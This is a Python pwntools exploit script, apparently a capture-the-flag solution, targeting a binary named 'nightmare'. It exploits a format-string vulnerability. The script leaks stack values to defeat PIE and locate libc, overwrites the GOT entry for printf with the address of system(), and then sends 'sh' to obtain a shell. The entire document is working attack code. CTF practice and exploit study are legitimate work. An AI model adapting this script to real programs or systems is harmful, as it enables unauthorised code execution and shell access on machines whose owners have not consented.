from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Function to be called by FmtStr
def send_payload(payload):
    io.sendlineafter('>', menu_option)
    io.sendlineafter('>', payload)
    io.recvuntil('> ')
    return io.recvline().strip()


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
piebase
breakrva 0x1438
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './nightmare'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = process(exe)

menu_option = '1'  # global var for send_payload

# Calculate format string offset, so we can use later in write operations
format_string = FmtStr(execute_fmt=send_payload)
info("format string offset: %d", format_string.offset)

io = start()

menu_option = '2'  # option used for leaking

# Leak 7th address from stack - Looking for PIE
leaked_addr = int(send_payload('%{}$p'.format(9)), 16)
info('leaked_addr: %#x', leaked_addr)
# Get the PIE base address and update our ELF (makes life super easy xD)
elf.address = leaked_addr - 0x14d5  # Offset calculated in GDB
info('piebase_addr: %#x', elf.address)

# Leak 11th address from stack - Looking for LIB-C
leaked_addr = int(send_payload('%{}$p'.format(13)), 16)
info('leaked_addr: %#x', leaked_addr)
# Get System address from libc, then calculate libc base address
libc_base = leaked_addr - 234  # Offset calculated in GDB
system_addr = libc_base + 0x48e50
info('libc_base: %#x', libc_base)
info('system_addr: %#x', system_addr)

# Get got.printf address which we want to overwrite with system()
got_printf = elf.address + 0x3568
info('got_printf: %#x', got_printf)

menu_option = '1'  # option used for writing

io.send('1')  # Seems to be needed to get menu working again
io.recv()

# Overwrite got.printf address with address of system()
format_string.write(got_printf, system_addr)
# Execute the write operations
format_string.execute_writes()

io.sendline('2')  # This time we want to "enter code"
io.recv()
io.sendline('sh')  # Printf is now called (but actually system) so we pass 'sh'

# Got Shell?
io.interactive()
